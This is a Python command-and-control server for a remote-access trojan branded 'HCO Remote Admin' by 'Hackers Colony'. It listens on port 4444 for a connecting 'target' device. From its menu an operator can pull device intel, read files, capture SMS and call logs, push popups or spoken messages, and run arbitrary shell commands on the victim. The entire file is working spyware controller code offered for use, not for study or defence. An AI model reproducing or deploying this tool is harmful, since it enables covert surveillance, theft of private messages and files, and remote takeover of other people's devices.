import socket
import sys

# ANSI Color & Style Codes
RESET = "\033[0m"
BOLD = "\033[1m"
RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
BLUE = "\033[94m"
CYAN = "\033[96m"
MAGENTA = "\033[95m"
WHITE = "\033[97m"

def show_menu():
    print(f"\n{MAGENTA}╔════════════════════════════════════════════════════════╗{RESET}")
    print(f"{GREEN}{BOLD}║         HCO REMOTE ADMIN - CONTROL CENTER v6.0         ║{RESET}")
    print(f"{CYAN}║             Coded by Azhar (Hackers Colony)            ║{RESET}")
    print(f"{MAGENTA}╚════════════════════════════════════════════════════════╝{RESET}")
    print(f" {YELLOW}[1]{RESET} {CYAN}Deep Target Intel (Brand, Model, RAM, Network){RESET}")
    print(f" {YELLOW}[2]{RESET} {CYAN}Send Voice Alert (Text-to-Speech){RESET}")
    print(f" {YELLOW}[3]{RESET} {CYAN}Download / Read File From Target{RESET}")
    print(f" {YELLOW}[4]{RESET} {CYAN}Push Auto-Note / Screen Popup{RESET}")
    print(f" {YELLOW}[5]{RESET} {CYAN}List All Installed Applications (Check Apps){RESET}")
    print(f" {YELLOW}[6]{RESET} {CYAN}Check Battery & Disk Storage Health{RESET}")
    print(f" {YELLOW}[7]{RESET} {CYAN}Capture SMS / Call Logs (If accessible){RESET}")
    print(f" {YELLOW}[8]{RESET} {CYAN}Execute Custom Shell Command{RESET}")
    print(f" {YELLOW}[9]{RESET} {RED}Exit Remote Session{RESET}")
    print(f"{MAGENTA}════════════════════════════════════════════════════════{RESET}")

def start_server():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind(('0.0.0.0', 4444))
    server.listen(1)
    
    print(f"\n{GREEN}[+] HCO Server Listening on Port 4444... Waiting for Target Connection...{RESET}")
    
    conn, addr = server.accept()
    print(f"\n{GREEN}╔════════════════════════════════════════╗{RESET}")
    print(f"{GREEN}║ [+] TARGET CONNECTED SUCCESSFULLY!     ║{RESET}")
    print(f"{GREEN}║ IP Address: {addr[0]:<26} ║{RESET}")
    print(f"{GREEN}╚════════════════════════════════════════╝{RESET}\n")
    
    while True:
        show_menu()
        choice = input(f"{BOLD}{YELLOW}HCO-ControlCenter> {RESET}").strip()
        
        if choice == '1':
            conn.send(b'sysinfo')
            print(f"\n{YELLOW}[*] Fetching real-time device hardware intel...{RESET}")
            output = conn.recv(16384).decode()
            print(f"\n{CYAN}┌────────────────────────────────────────┐{RESET}")
            print(f"{CYAN}│{BOLD}       TARGET HARDWARE & INTEL REPORT   {RESET}{CYAN}│{RESET}")
            print(f"{CYAN}├────────────────────────────────────────┤{RESET}")
            print(output)
            print(f"{CYAN}└────────────────────────────────────────┘{RESET}")
            
        elif choice == '2':
            msg = input(f"{YELLOW}[?] Enter text to speak on target speaker: {RESET}")
            conn.send(f"alert:{msg}".encode())
            output = conn.recv(1024).decode()
            print(f"\n{GREEN}[+] {output}{RESET}")
            
        elif choice == '3':
            file_path = input(f"{YELLOW}[?] Enter full file path (e.g., /sdcard/download/test.txt): {RESET}")
            conn.send(f"download:{file_path}".encode())
            output = conn.recv(16384).decode()
            print(f"\n{BLUE}═══════════════ FILE CONTENT ═══════════════{RESET}")
            print(output)
            print(f"{BLUE}════════════════════════════════════════════{RESET}")
            
        elif choice == '4':
            note_text = input(f"{YELLOW}[?] Enter notification text for target screen: {RESET}")
            conn.send(f"popup:{note_text}".encode())
            output = conn.recv(1024).decode()
            print(f"\n{GREEN}[+] {output}{RESET}")
            
        elif choice == '5':
            conn.send(b'apps')
            print(f"\n{YELLOW}[*] Extracting list of installed applications...{RESET}")
            output = conn.recv(32768).decode()
            print(f"\n{MAGENTA}══════════════ INSTALLED APPS LIST ══════════════{RESET}")
            print(output)
            print(f"{MAGENTA}═════════════════════════════════════════════════{RESET}")
            
        elif choice == '6':
            conn.send(b'battery')
            print(f"\n{YELLOW}[*] Checking battery health and disk storage...{RESET}")
            output = conn.recv(8192).decode()
            print(f"\n{CYAN}══════════════ BATTERY & STORAGE ══════════════{RESET}")
            print(output)
            print(f"{CYAN}═══════════════════════════════════════════════{RESET}")
            
        elif choice == '7':
            conn.send(b'logs')
            print(f"\n{YELLOW}[*] Scanning device logs / databases...{RESET}")
            output = conn.recv(16384).decode()
            print(f"\n{GREEN}══════════════ DEVICE LOGS REPORT ══════════════{RESET}")
            print(output)
            print(f"{GREEN}════════════════════════════════════════════════{RESET}")
            
        elif choice == '8':
            cmd = input(f"{BOLD}{RED}HCO-Shell> {RESET}")
            if cmd.strip() == "": continue
            conn.send(f"cmd:{cmd}".encode())
            output = conn.recv(16384).decode()
            print(f"\n{WHITE}---------------- SHELL OUTPUT ----------------\n{output}\n----------------------------------------------")
            
        elif choice == '9':
            conn.send(b'exit')
            print(f"{RED}[*] Terminating session securely. Goodbye!{RESET}")
            break
        else:
            print(f"{RED}[-] Invalid Option! Choose between 1-9.{RESET}")
            
    conn.close()
    server.close()

if __name__ == "__main__":
    start_server()
